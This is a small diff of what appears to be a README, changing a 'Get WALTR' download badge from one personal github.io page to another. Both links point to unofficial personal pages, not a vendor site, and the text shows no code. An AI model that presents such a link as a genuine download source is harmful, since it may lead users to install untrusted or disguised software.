@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-  <a href="https://manhyusuu48.github.io/.github/WALTR">  
+  <a href="https://tembilamusion.github.io/.github/WALTR">  
     <img src="https://img.shields.io/badge/⬇️_Get_WALTR_-FF4500?style=for-the-badge&logo=apple&logoColor=white" alt="Download WALTR for Mac">  
   </a>  
 </div>  
